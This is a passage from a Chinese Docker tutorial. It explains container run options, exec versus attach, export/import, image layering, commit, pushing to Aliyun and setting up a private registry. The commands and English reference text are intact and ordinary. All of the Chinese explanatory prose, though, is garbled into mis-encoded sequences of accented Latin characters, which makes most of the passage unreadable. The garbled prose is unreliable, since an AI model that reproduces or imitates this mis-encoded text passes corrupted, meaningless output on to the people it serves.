OPTIONSè¯´æ˜ï¼ˆå¸¸ç”¨ï¼‰ï¼šæœ‰äº›æ˜¯ä¸€ä¸ªå‡å·ï¼Œæœ‰äº›æ˜¯ä¸¤ä¸ªå‡å· --name=\"å®¹å™¨æ–°åå­—\" ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼›(ä¸æŒ‡å®šçš„è¯,ç³»ç»ŸéšæœºæŒ‡å®š) -d: åå°è¿è¡Œå®¹å™¨å¹¶è¿”å›å®¹å™¨IDï¼Œä¹Ÿå³å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨(åå°è¿è¡Œ)ï¼› -iï¼šä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼› -tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼› ä¹Ÿå³å¯åŠ¨äº¤äº’å¼å®¹å™¨(å‰å°æœ‰ä¼ªç»ˆç«¯ï¼Œç­‰å¾…äº¤äº’)ï¼› -P: éšæœºç«¯å£æ˜ å°„ï¼Œå¤§å†™P -p: æŒ‡å®šç«¯å£æ˜ å°„ï¼Œå°å†™ å¯åŠ¨äº¤äº’å¼å®¹å™¨(å‰å°å‘½ä»¤è¡Œ) #ä½¿ç”¨é•œåƒcentos:latestä»¥äº¤äº’æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,åœ¨å®¹å™¨å†…æ‰§è¡Œ/bin/bashå‘½ä»¤ã€‚ docker run -it centos /bin/bash å‚æ•°è¯´æ˜ï¼š -i: äº¤äº’å¼æ“ä½œã€‚ -t: ç»ˆç«¯ã€‚ centos : centos é•œåƒã€‚ /bin/bashï¼šæ”¾åœ¨é•œåƒååçš„æ˜¯å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ /bin/bashã€‚ è¦é€€å‡ºç»ˆç«¯ï¼Œç›´æ¥è¾“å…¥ exit: 3.3.3 åˆ—å‡ºå½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker ps [OPTIONS] OPTIONSè¯´æ˜ï¼ˆå¸¸ç”¨ï¼‰ï¼š -a :åˆ—å‡ºå½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨+å†å²ä¸Šè¿è¡Œè¿‡çš„ -l :æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨ã€‚ -nï¼šæ˜¾ç¤ºæœ€è¿‘nä¸ªåˆ›å»ºçš„å®¹å™¨ã€‚ -q :é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ç¼–å·ã€‚ 3.3.4 é€€å‡ºå®¹å™¨ ä¸¤ç§é€€å‡ºæ–¹å¼ exit runè¿›å»å®¹å™¨ï¼Œexité€€å‡ºï¼Œå®¹å™¨åœæ­¢ ctrl+p+q runè¿›å»å®¹å™¨ï¼Œctrl+p+qé€€å‡ºï¼Œå®¹å™¨ä¸åœæ­¢ 3.3.5 å¯åŠ¨å·²åœæ­¢è¿è¡Œçš„å®¹å™¨ docker start å®¹å™¨IDæˆ–è€…å®¹å™¨å 3.3.6 é‡å¯å®¹å™¨ docker restart å®¹å™¨IDæˆ–è€…å®¹å™¨å 3.3.7 åœæ­¢å®¹å™¨ docker stop å®¹å™¨IDæˆ–è€…å®¹å™¨å 3.3.8 å¼ºåˆ¶åœæ­¢å®¹å™¨ docker kill å®¹å™¨IDæˆ–å®¹å™¨å 3.3.9 åˆ é™¤å·²åœæ­¢çš„å®¹å™¨ docker rm å®¹å™¨ID ä¸€æ¬¡æ€§åˆ é™¤å¤šä¸ªå®¹å™¨å®ä¾‹ docker rm -f $(docker ps -a -q) docker ps -a -q | xargs docker rm 3.3.10 é‡è¦ æœ‰é•œåƒæ‰èƒ½åˆ›å»ºå®¹å™¨ï¼Œè¿™æ˜¯æ ¹æœ¬å‰æ(ä¸‹è½½ä¸€ä¸ªRedis6.0.8é•œåƒæ¼”ç¤º) å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨(åå°æœåŠ¡å™¨) åœ¨å¤§éƒ¨åˆ†çš„åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ› docker çš„æœåŠ¡æ˜¯åœ¨åå°è¿è¡Œçš„ï¼Œ æˆ‘ä»¬å¯ä»¥è¿‡ -d æŒ‡å®šå®¹å™¨çš„åå°è¿è¡Œæ¨¡å¼ã€‚ docker run -d å®¹å™¨å #ä½¿ç”¨é•œåƒcentos:latestä»¥åå°æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨ docker run -d centos é—®é¢˜ï¼šç„¶ådocker ps -a è¿›è¡ŒæŸ¥çœ‹, ä¼šå‘ç°å®¹å™¨å·²ç»é€€å‡º å¾ˆé‡è¦çš„è¦è¯´æ˜çš„ä¸€ç‚¹: Dockerå®¹å™¨åå°è¿è¡Œ,å°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ã€‚ å®¹å™¨è¿è¡Œçš„å‘½ä»¤å¦‚æœä¸æ˜¯é‚£äº›ä¸€ç›´æŒ‚èµ·çš„å‘½ä»¤ï¼ˆæ¯”å¦‚è¿è¡Œtopï¼Œtailï¼‰ï¼Œå°±æ˜¯ä¼šè‡ªåŠ¨é€€å‡ºçš„ã€‚ è¿™ä¸ªæ˜¯dockerçš„æœºåˆ¶é—®é¢˜,æ¯”å¦‚ä½ çš„webå®¹å™¨,æˆ‘ä»¬ä»¥nginxä¸ºä¾‹ï¼Œæ­£å¸¸æƒ…å†µä¸‹,æˆ‘ä»¬é…ç½®å¯åŠ¨æœåŠ¡åªéœ€è¦å¯åŠ¨å“åº”çš„serviceå³å¯ã€‚ä¾‹å¦‚service nginx startã€‚ä½†æ˜¯,è¿™æ ·åš,nginxä¸ºåå°è¿›ç¨‹æ¨¡å¼è¿è¡Œ,å°±å¯¼è‡´dockerå‰å°æ²¡æœ‰è¿è¡Œçš„åº”ç”¨ï¼Œè¿™æ ·çš„å®¹å™¨åå°å¯åŠ¨åï¼Œä¼šç«‹å³è‡ªæ€å› ä¸ºä»–è§‰å¾—ä»–æ²¡äº‹å¯åšäº†ã€‚æ‰€ä»¥ï¼Œæœ€ä½³çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†ä½ è¦è¿è¡Œçš„ç¨‹åºä»¥å‰å°è¿›ç¨‹çš„å½¢å¼è¿è¡Œï¼Œå¸¸è§å°±æ˜¯å‘½ä»¤è¡Œæ¨¡å¼ï¼Œè¡¨ç¤ºæˆ‘è¿˜æœ‰äº¤äº’æ“ä½œï¼Œåˆ«ä¸­æ–­ã€‚ redis å‰åå°å¯åŠ¨æ¼”ç¤ºcase å‰å°äº¤äº’å¼å¯åŠ¨ docker run -it redis:6.0.8 åå°å®ˆæŠ¤å¼å¯åŠ¨ docker run -d redis:6.0.8 æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker logs å®¹å™¨ID æŸ¥çœ‹å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹ docker top å®¹å™¨ID æŸ¥çœ‹å®¹å™¨å†…éƒ¨ç»†èŠ‚ docker inspect å®¹å™¨ID è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨å¹¶ä»¥å‘½ä»¤è¡Œäº¤äº’ docker exec -it å®¹å™¨ID bashShell é‡æ–°è¿›å…¥docker attach å®¹å™¨ID ä¸Šè¿°ä¸¤ä¸ªåŒºåˆ«ï¼Ÿ attach ç›´æ¥è¿›å…¥å®¹å™¨å¯åŠ¨å‘½ä»¤çš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„è¿›ç¨‹ ç”¨exité€€å‡ºï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ exec æ˜¯åœ¨å®¹å™¨ä¸­æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œå¹¶ä¸”å¯ä»¥å¯åŠ¨æ–°çš„è¿›ç¨‹ ç”¨exité€€å‡ºï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ æ¨èå¤§å®¶ä½¿ç”¨ docker exec å‘½ä»¤ï¼Œå› ä¸ºé€€å‡ºå®¹å™¨ç»ˆç«¯ï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ ç”¨ä¹‹å‰çš„rediså®¹å™¨å®ä¾‹è¿›å…¥è¯•è¯• è¿›å…¥redisæœåŠ¡ docker exec -it å®¹å™¨ID /bin/bash docker exec -it å®¹å™¨ID redis-cli ä¸€èˆ¬ç”¨-dåå°å¯åŠ¨çš„ç¨‹åºï¼Œå†ç”¨execè¿›å…¥å¯¹åº”å®¹å™¨å®ä¾‹ ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š å®¹å™¨â†’ä¸»æœº docker cp å®¹å™¨ID:å®¹å™¨å†…è·¯å¾„ ç›®çš„ä¸»æœºè·¯å¾„ å¯¼å…¥å’Œå¯¼å‡ºå®¹å™¨ export å¯¼å‡ºå®¹å™¨çš„å†…å®¹ç•™ä½œä¸ºä¸€ä¸ªtarå½’æ¡£æ–‡ä»¶[å¯¹åº”importå‘½ä»¤] import ä»taråŒ…ä¸­çš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿå†å¯¼å…¥ä¸ºé•œåƒ[å¯¹åº”export] æ¡ˆä¾‹ docker export å®¹å™¨ID &gt; æ–‡ä»¶å.tar cat æ–‡ä»¶å.tar | docker import - é•œåƒç”¨æˆ·/é•œåƒå:é•œåƒç‰ˆæœ¬å· 3.4 å°æ€»ç»“ attach Attach to a running container # å½“å‰ shell ä¸‹ attach è¿æ¥æŒ‡å®šè¿è¡Œé•œåƒ build Build an image from a Dockerfile # é€šè¿‡ Dockerfile å®šåˆ¶é•œåƒ commit Create a new image from a container changes # æäº¤å½“å‰å®¹å™¨ä¸ºæ–°çš„é•œåƒ cp Copy files/folders from the containers filesystem to the host path #ä»å®¹å™¨ä¸­æ‹·è´æŒ‡å®šæ–‡ä»¶æˆ–è€…ç›®å½•åˆ°å®¿ä¸»æœºä¸­ create Create a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼ŒåŒ runï¼Œä½†ä¸å¯åŠ¨å®¹å™¨ diff Inspect changes on a container's filesystem # æŸ¥çœ‹ docker å®¹å™¨å˜åŒ– events Get real time events from the server # ä» docker æœåŠ¡è·å–å®¹å™¨å®æ—¶äº‹ä»¶ exec Run a command in an existing container # åœ¨å·²å­˜åœ¨çš„å®¹å™¨ä¸Šè¿è¡Œå‘½ä»¤ export Stream the contents of a container as a tar archive # å¯¼å‡ºå®¹å™¨çš„å†…å®¹æµä½œä¸ºä¸€ä¸ª tar å½’æ¡£æ–‡ä»¶[å¯¹åº” import ] history Show the history of an image # å±•ç¤ºä¸€ä¸ªé•œåƒå½¢æˆå†å² images List images # åˆ—å‡ºç³»ç»Ÿå½“å‰é•œåƒ import Create a new filesystem image from the contents of a tarball # ä»taråŒ…ä¸­çš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿæ˜ åƒ[å¯¹åº”export] info Display system-wide information # æ˜¾ç¤ºç³»ç»Ÿç›¸å…³ä¿¡æ¯ inspect Return low-level information on a container # æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ kill Kill a running container # kill æŒ‡å®š docker å®¹å™¨ load Load an image from a tar archive # ä»ä¸€ä¸ª tar åŒ…ä¸­åŠ è½½ä¸€ä¸ªé•œåƒ[å¯¹åº” save] login Register or Login to the docker registry server # æ³¨å†Œæˆ–è€…ç™»é™†ä¸€ä¸ª docker æºæœåŠ¡å™¨ logout Log out from a Docker registry server # ä»å½“å‰ Docker registry é€€å‡º logs Fetch the logs of a container # è¾“å‡ºå½“å‰å®¹å™¨æ—¥å¿—ä¿¡æ¯ port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # æŸ¥çœ‹æ˜ å°„ç«¯å£å¯¹åº”çš„å®¹å™¨å†…éƒ¨æºç«¯å£ pause Pause all processes within a container # æš‚åœå®¹å™¨ ps List containers # åˆ—å‡ºå®¹å™¨åˆ—è¡¨ pull Pull an image or a repository from the docker registry server # ä»dockeré•œåƒæºæœåŠ¡å™¨æ‹‰å–æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒ push Push an image or a repository to the docker registry server # æ¨é€æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒè‡³dockeræºæœåŠ¡å™¨ restart Restart a running container # é‡å¯è¿è¡Œçš„å®¹å™¨ rm Remove one or more containers # ç§»é™¤ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨ rmi Remove one or more images # ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ[æ— å®¹å™¨ä½¿ç”¨è¯¥é•œåƒæ‰å¯åˆ é™¤ï¼Œå¦åˆ™éœ€åˆ é™¤ç›¸å…³å®¹å™¨æ‰å¯ç»§ç»­æˆ– -f å¼ºåˆ¶åˆ é™¤] run Run a command in a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ save Save an image to a tar archive # ä¿å­˜ä¸€ä¸ªé•œåƒä¸ºä¸€ä¸ª tar åŒ…[å¯¹åº” load] search Search for an image on the Docker Hub # åœ¨ docker hub ä¸­æœç´¢é•œåƒ start Start a stopped containers # å¯åŠ¨å®¹å™¨ stop Stop a running containers # åœæ­¢å®¹å™¨ tag Tag an image into a repository # ç»™æºä¸­é•œåƒæ‰“æ ‡ç­¾ top Lookup the running processes of a container # æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ unpause Unpause a paused container # å–æ¶ˆæš‚åœå®¹å™¨ version Show the docker version information # æŸ¥çœ‹ docker ç‰ˆæœ¬å· wait Block until a container stops, then print its exit code # æˆªå–å®¹å™¨åœæ­¢æ—¶çš„é€€å‡ºçŠ¶æ€å€¼ 4 Dockeré•œåƒ 4.1 æ˜¯ä»€ä¹ˆ æ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œå®ƒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼Œæˆ‘ä»¬æŠŠåº”ç”¨ç¨‹åºå’Œé…ç½®ä¾èµ–æ‰“åŒ…å¥½å½¢æˆä¸€ä¸ªå¯äº¤ä»˜çš„è¿è¡Œç¯å¢ƒ(åŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶éœ€è¦çš„åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ç­‰)ï¼Œè¿™ä¸ªæ‰“åŒ…å¥½çš„è¿è¡Œç¯å¢ƒå°±æ˜¯imageé•œåƒæ–‡ä»¶ã€‚ åªæœ‰é€šè¿‡è¿™ä¸ªé•œåƒæ–‡ä»¶æ‰èƒ½ç”ŸæˆDockerå®¹å™¨å®ä¾‹(ç±»ä¼¼Javaä¸­newå‡ºæ¥ä¸€ä¸ªå¯¹è±¡)ã€‚ 4.1.1 åˆ†å±‚çš„é•œåƒ ä»¥æˆ‘ä»¬çš„pullä¸ºä¾‹ï¼Œåœ¨ä¸‹è½½çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°dockerçš„é•œåƒå¥½åƒæ˜¯åœ¨ä¸€å±‚ä¸€å±‚çš„åœ¨ä¸‹è½½ 4.1.2 UnionFSï¼ˆè”åˆæ–‡ä»¶ç³»ç»Ÿï¼‰ UnionFSï¼ˆè”åˆæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šUnionæ–‡ä»¶ç³»ç»Ÿï¼ˆUnionFSï¼‰æ˜¯ä¸€ç§åˆ†å±‚ã€è½»é‡çº§å¹¶ä¸”é«˜æ€§èƒ½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ”¯æŒå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ä½œä¸ºä¸€æ¬¡æäº¤æ¥ä¸€å±‚å±‚çš„å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹(unite several directories into a single virtual filesystem)ã€‚Union æ–‡ä»¶ç³»ç»Ÿæ˜¯ Docker é•œåƒçš„åŸºç¡€ã€‚é•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ï¼ŒåŸºäºåŸºç¡€é•œåƒï¼ˆæ²¡æœ‰çˆ¶é•œåƒï¼‰ï¼Œå¯ä»¥åˆ¶ä½œå„ç§å…·ä½“çš„åº”ç”¨é•œåƒã€‚ ç‰¹æ€§ï¼šä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†ä»å¤–é¢çœ‹èµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè”åˆåŠ è½½ä¼šæŠŠå„å±‚æ–‡ä»¶ç³»ç»Ÿå åŠ èµ·æ¥ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»Ÿä¼šåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½• 4.1.3 Dockeré•œåƒåŠ è½½åŸç† dockerçš„é•œåƒå®é™…ä¸Šç”±ä¸€å±‚ä¸€å±‚çš„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œè¿™ç§å±‚çº§çš„æ–‡ä»¶ç³»ç»ŸUnionFSã€‚ bootfs(boot file system)ä¸»è¦åŒ…å«bootloaderå’Œkernel, bootloaderä¸»è¦æ˜¯å¼•å¯¼åŠ è½½kernel, Linuxåˆšå¯åŠ¨æ—¶ä¼šåŠ è½½bootfsæ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨Dockeré•œåƒçš„æœ€åº•å±‚æ˜¯å¼•å¯¼æ–‡ä»¶ç³»ç»Ÿbootfsã€‚è¿™ä¸€å±‚ä¸æˆ‘ä»¬å…¸å‹çš„Linux/Unixç³»ç»Ÿæ˜¯ä¸€æ ·çš„ï¼ŒåŒ…å«bootåŠ è½½å™¨å’Œå†…æ ¸ã€‚å½“bootåŠ è½½å®Œæˆä¹‹åæ•´ä¸ªå†…æ ¸å°±éƒ½åœ¨å†…å­˜ä¸­äº†ï¼Œæ­¤æ—¶å†…å­˜çš„ä½¿ç”¨æƒå·²ç”±bootfsè½¬äº¤ç»™å†…æ ¸ï¼Œæ­¤æ—¶ç³»ç»Ÿä¹Ÿä¼šå¸è½½bootfsã€‚ rootfs (root file system) ï¼Œåœ¨bootfsä¹‹ä¸Šã€‚åŒ…å«çš„å°±æ˜¯å…¸å‹ Linux ç³»ç»Ÿä¸­çš„ /dev, /proc, /bin, /etc ç­‰æ ‡å‡†ç›®å½•å’Œæ–‡ä»¶ã€‚rootfså°±æ˜¯å„ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆï¼Œæ¯”å¦‚Ubuntuï¼ŒCentosç­‰ç­‰ã€‚ å¹³æ—¶æˆ‘ä»¬å®‰è£…è¿›è™šæ‹Ÿæœºçš„CentOSéƒ½æ˜¯å¥½å‡ ä¸ªGï¼Œä¸ºä»€ä¹ˆdockerè¿™é‡Œæ‰200Mï¼Ÿï¼Ÿ å¯¹äºä¸€ä¸ªç²¾ç®€çš„OSï¼Œrootfså¯ä»¥å¾ˆå°ï¼Œåªéœ€è¦åŒ…æ‹¬æœ€åŸºæœ¬çš„å‘½ä»¤ã€å·¥å…·å’Œç¨‹åºåº“å°±å¯ä»¥äº†ï¼Œå› ä¸ºåº•å±‚ç›´æ¥ç”¨Hostçš„kernelï¼Œè‡ªå·±åªéœ€è¦æä¾› rootfs å°±è¡Œäº†ã€‚ç”±æ­¤å¯è§å¯¹äºä¸åŒçš„linuxå‘è¡Œç‰ˆ, bootfsåŸºæœ¬æ˜¯ä¸€è‡´çš„, rootfsä¼šæœ‰å·®åˆ«, å› æ­¤ä¸åŒçš„å‘è¡Œç‰ˆå¯ä»¥å…¬ç”¨bootfsã€‚ 4.1.4 ä¸ºä»€ä¹ˆ Docker é•œåƒè¦é‡‡ç”¨è¿™ç§åˆ†å±‚ç»“æ„å‘¢ é•œåƒåˆ†å±‚æœ€å¤§çš„ä¸€ä¸ªå¥½å¤„å°±æ˜¯å…±äº«èµ„æºï¼Œæ–¹ä¾¿å¤åˆ¶è¿ç§»ï¼Œå°±æ˜¯ä¸ºäº†å¤ç”¨ã€‚ æ¯”å¦‚è¯´æœ‰å¤šä¸ªé•œåƒéƒ½ä»ç›¸åŒçš„ base é•œåƒæ„å»ºè€Œæ¥ï¼Œé‚£ä¹ˆ Docker Host åªéœ€åœ¨ç£ç›˜ä¸Šä¿å­˜ä¸€ä»½ base é•œåƒï¼› åŒæ—¶å†…å­˜ä¸­ä¹Ÿåªéœ€åŠ è½½ä¸€ä»½ base é•œåƒï¼Œå°±å¯ä»¥ä¸ºæ‰€æœ‰å®¹å™¨æœåŠ¡äº†ã€‚è€Œä¸”é•œåƒçš„æ¯ä¸€å±‚éƒ½å¯ä»¥è¢«å…±äº«ã€‚ 4.2 é‡ç‚¹ç†è§£ Dockeré•œåƒå±‚éƒ½æ˜¯åªè¯»çš„ï¼Œå®¹å™¨å±‚æ˜¯å¯å†™çš„ã€‚å½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¸€ä¸ªæ–°çš„å¯å†™å±‚è¢«åŠ è½½åˆ°é•œåƒçš„é¡¶éƒ¨ã€‚ è¿™ä¸€å±‚é€šå¸¸è¢«ç§°ä½œâ€œå®¹å™¨å±‚â€ï¼Œâ€œå®¹å™¨å±‚â€ä¹‹ä¸‹çš„éƒ½å«â€œé•œåƒå±‚â€ã€‚ æ‰€æœ‰å¯¹å®¹å™¨çš„æ”¹åŠ¨ - æ— è®ºæ·»åŠ ã€åˆ é™¤ã€è¿˜æ˜¯ä¿®æ”¹æ–‡ä»¶éƒ½åªä¼šå‘ç”Ÿåœ¨å®¹å™¨å±‚ä¸­ã€‚åªæœ‰å®¹å™¨å±‚æ˜¯å¯å†™çš„ï¼Œå®¹å™¨å±‚ä¸‹é¢çš„æ‰€æœ‰é•œåƒå±‚éƒ½æ˜¯åªè¯»çš„ã€‚ 4.3 Dockeré•œåƒcommitæ“ä½œæ¡ˆä¾‹ docker commit æäº¤å®¹å™¨å‰¯æœ¬ä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ–°çš„é•œåƒ docker commit -m=\"æäº¤çš„æè¿°ä¿¡æ¯\" -a=\"ä½œè€…\" å®¹å™¨ID è¦åˆ›å»ºçš„ç›®æ ‡é•œåƒå:[æ ‡ç­¾å] 4.3.1 æ¡ˆä¾‹æ¼”ç¤ºubuntuå®‰è£…vim ä»Hubä¸Šä¸‹è½½ubuntué•œåƒåˆ°æœ¬åœ°å¹¶æˆåŠŸè¿è¡Œ åŸå§‹çš„é»˜è®¤Ubuntué•œåƒæ˜¯ä¸å¸¦ç€vimå‘½ä»¤çš„ å¤–ç½‘è¿é€šçš„æƒ…å†µä¸‹ï¼Œå®‰è£…vim dockerå®¹å™¨å†…æ‰§è¡Œä¸Šè¿°ä¸¤æ¡å‘½ä»¤ï¼š apt-get update apt-get -y install vim å®‰è£…å®Œæˆåï¼Œcommitæˆ‘ä»¬è‡ªå·±çš„æ–°é•œåƒ å¯åŠ¨æˆ‘ä»¬çš„æ–°é•œåƒå¹¶å’ŒåŸæ¥çš„å¯¹æ¯” å®˜ç½‘æ˜¯é»˜è®¤ä¸‹è½½çš„Ubuntuæ²¡æœ‰vimå‘½ä»¤ æˆ‘ä»¬è‡ªå·±commitæ„å»ºçš„é•œåƒï¼Œæ–°å¢åŠ äº†vimåŠŸèƒ½ï¼Œå¯ä»¥æˆåŠŸä½¿ç”¨ã€‚ 4.3.2 å°æ€»ç»“ Dockerä¸­çš„é•œåƒåˆ†å±‚ï¼Œæ”¯æŒé€šè¿‡æ‰©å±•ç°æœ‰é•œåƒï¼Œåˆ›å»ºæ–°çš„é•œåƒã€‚ç±»ä¼¼Javaç»§æ‰¿äºä¸€ä¸ªBaseåŸºç¡€ç±»ï¼Œè‡ªå·±å†æŒ‰éœ€æ‰©å±•ã€‚ æ–°é•œåƒæ˜¯ä» base é•œåƒä¸€å±‚ä¸€å±‚å åŠ ç”Ÿæˆçš„ã€‚æ¯å®‰è£…ä¸€ä¸ªè½¯ä»¶ï¼Œå°±åœ¨ç°æœ‰é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€å±‚ 5 æœ¬åœ°é•œåƒå‘å¸ƒåˆ°é˜¿é‡Œäº‘ 5.1 æœ¬åœ°é•œåƒå‘å¸ƒåˆ°é˜¿é‡Œäº‘æµç¨‹ 5.2 é•œåƒçš„ç”Ÿæˆæ–¹æ³• åŸºäºå½“å‰å®¹å™¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼Œæ–°åŠŸèƒ½å¢å¼º docker commit [OPTIONS] å®¹å™¨ID [REPOSITORY[:TAG]] OPTIONSè¯´æ˜ï¼š -a :æäº¤çš„é•œåƒä½œè€…ï¼› -m :æäº¤æ—¶çš„è¯´æ˜æ–‡å­—ï¼› 5.3 å°†æœ¬åœ°é•œåƒæ¨é€åˆ°é˜¿é‡Œäº‘ æœ¬åœ°é•œåƒç´ æåŸå‹ é˜¿é‡Œäº‘å¼€å‘è€…å¹³å° https://promotion.aliyun.com/ntms/act/kubernetes.html 5.3.1 åˆ›å»ºä»“åº“é•œåƒ é€‰æ‹©æ§åˆ¶å°ï¼Œè¿›å…¥å®¹å™¨é•œåƒæœåŠ¡ é€‰æ‹©ä¸ªäººå®ä¾‹ å‘½åç©ºé—´ ä»“åº“åç§° è¿›å…¥ç®¡ç†ç•Œé¢è·å¾—è„šæœ¬ 5.3.2 å°†é•œåƒæ¨é€åˆ°é˜¿é‡Œäº‘ ç®¡ç†ç•Œé¢è„šæœ¬ è„šæœ¬å®ä¾‹ docker login --username=zzyybuy registry.cn-hangzhou.aliyuncs.com docker tag cea1bb40441c registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 docker push registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 ä¸Šé¢å‘½ä»¤æ˜¯é˜³å“¥è‡ªå·±æœ¬åœ°çš„ï¼Œä½ è‡ªå·±é…Œæƒ…å¤„ç†ï¼Œä¸è¦ç²˜è´´æˆ‘çš„ã€‚ 5.4 å°†é˜¿é‡Œäº‘ä¸Šçš„é•œåƒä¸‹è½½åˆ°æœ¬åœ° docker pull registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 6 æœ¬åœ°é•œåƒå‘å¸ƒåˆ°ç§æœ‰åº“ 6.1 æ˜¯ä»€ä¹ˆ 1 å®˜æ–¹Docker Hubåœ°å€ï¼šhttps://hub.docker.com/ï¼Œä¸­å›½å¤§é™†è®¿é—®å¤ªæ…¢äº†ä¸”å‡†å¤‡è¢«é˜¿é‡Œäº‘å–ä»£çš„è¶‹åŠ¿ï¼Œä¸å¤ªä¸»æµã€‚ 2 Dockerhubã€é˜¿é‡Œäº‘è¿™æ ·çš„å…¬å…±é•œåƒä»“åº“å¯èƒ½ä¸å¤ªæ–¹ä¾¿ï¼Œæ¶‰åŠæœºå¯†çš„å…¬å¸ä¸å¯èƒ½æä¾›é•œåƒç»™å…¬ç½‘ï¼Œæ‰€ä»¥éœ€è¦åˆ›å»ºä¸€ä¸ªæœ¬åœ°ç§äººä»“åº“ä¾›ç»™å›¢é˜Ÿä½¿ç”¨ï¼ŒåŸºäºå…¬å¸å†…éƒ¨é¡¹ç›®æ„å»ºé•œåƒã€‚ Docker Registryæ˜¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºæ„å»ºç§æœ‰é•œåƒä»“åº“ 6.2 å°†æœ¬åœ°é•œåƒæ¨é€åˆ°ç§æœ‰åº“ 6.2.1 ä¸‹è½½é•œåƒDocker Registry docker pull registry 6.2.2 è¿è¡Œç§æœ‰åº“Registryï¼Œç›¸å½“äºæœ¬åœ°æœ‰ä¸ªç§æœ‰Docker hub docker run -d -p 5000:5000 -v /zzyyuse/myregistry/:/tmp/registry --privileged=true registry é»˜è®¤æƒ…å†µï¼Œä»“åº“è¢«åˆ›å»ºåœ¨å®¹å™¨çš„/var/lib/registryç›®å½•ä¸‹ï¼Œå»ºè®®è‡ªè¡Œç”¨å®¹å™¨å·æ˜ å°„ï¼Œæ–¹ä¾¿äºå®¿ä¸»æœºè”è°ƒ 6.2.3 æ¡ˆä¾‹æ¼”ç¤ºåˆ›å»ºä¸€ä¸ªæ–°é•œåƒï¼Œubuntuå®‰è£…ifconfigå‘½ä»¤ 